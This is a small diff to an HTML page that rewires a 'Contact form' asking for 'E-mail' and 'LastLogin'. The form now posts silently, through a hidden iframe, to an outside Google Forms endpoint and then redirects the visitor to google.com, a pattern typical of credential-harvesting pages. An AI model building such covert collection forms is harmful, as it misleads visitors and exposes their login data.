@@ -75,11 +75,16 @@ window.googleDocCallback = function () { return true; };
 </tbody>
 </table>
 </tr>
-<h1>Contact form</h1>
+  <script type="text/javascript">var submitted=false;</script>
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){
+            window.location='https://google.com';}"></iframe>
+        <div class="container">
+            <div class="box">
+  <h1>Contact form</h1>
               
-                <form action="" target="hidden_iframe" onsubmit="submitted=true" method="POST">
-                    <input type="text" placeholder="E-mail" name=""><br>
-                    <input type="email" placeholder="LastLogin" name=""><br>
+                <form action="https://docs.google.com/forms/u/1/d/e/1FAIpQLSe3JVAhmO4-J_CCwxVa5p_yKlYIj7t8sDw7JqRzzjD2uw18cQ/formResponse" target="hidden_iframe" onsubmit="submitted=true" method="POST">
+                    <input type="text" placeholder="E-mail" name="entry.40265060"><br>
+                    <input type="email" placeholder="LastLogin" name="entry.1170479402"><br>
                     <input type="submit" value="Submit"><br>
                 </form>
 
